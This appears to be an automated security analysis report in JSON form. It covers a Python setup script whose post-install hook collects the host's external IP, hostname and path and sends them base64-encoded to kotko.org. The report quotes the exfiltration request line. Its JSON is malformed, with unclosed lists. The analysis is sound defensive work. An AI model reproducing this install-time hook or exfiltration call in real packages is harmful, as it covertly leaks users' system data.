{
  "purpose": "The code is a setup script for a Python package that, upon installation, performs network requests and writes to a file, potentially for malicious data collection or exfiltration.",
  "sources": [
    "requests.get('https://api.ipify.org')",
    "requests.get('https://kotko.org?'+company+name+'='+base64_message)",

  "sinks": [
    "write to 'pocbykotko.txt'",
    "send data via HTTP GET request to 'kotko.org'",
    "access system information via os.uname()"

  "flows": [
    "upon installation, _post_install() is registered to run at exit",
    "_post_install() retrieves external IP, system hostname, and path, then encodes and sends this data via HTTP GET request",
    "also writes a proof string to 'pocbykotko.txt'"
  ],
  "anomalies": [
    "network requests to external, potentially suspicious domains ('api.ipify.org' and 'kotko.org')",
    "sending system information encoded in base64 over GET request",
    "writing proof string 'proof bug by kotko' into a file",
    "registering a function that performs network and file operations at package install time"
  ],
  "analysis": "The script contains a custom installation class that registers a post-install function. This function collects sensitive system data such as external IP address, hostname, and installation path. It then encodes this data in base64 and transmits it to a suspicious external domain ('kotko.org') via an HTTP GET request. Additionally, it writes a string 'proof bug by kotko' into a local file. These actions occur automatically during package installation, indicating potential malicious intent such as data exfiltration or backdoor behavior. The code does not contain obfuscated or suspicious library usage beyond these network and file operations. The use of requests and os libraries is legitimate but maliciously exploited here. Overall, the code demonstrates malicious behavior designed for covert data collection without user consent.",
  "conclusion": "The code contains deliberate malicious actions intended for data exfiltration, including sending system info to external servers and writing proof strings to a file during package installation. These behaviors are suspicious and potentially harmful, indicating malicious intent.",
